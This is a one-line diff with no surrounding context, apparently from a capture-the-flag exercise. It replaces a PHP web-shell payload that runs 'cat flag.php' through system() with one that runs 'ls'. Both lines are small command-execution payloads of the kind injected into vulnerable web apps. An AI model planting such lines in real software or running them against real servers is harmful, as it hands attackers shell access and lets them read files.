@@ -1,1 +1,1 @@
-<?php system('cat flag.php');?>
+<?php system('ls');?>
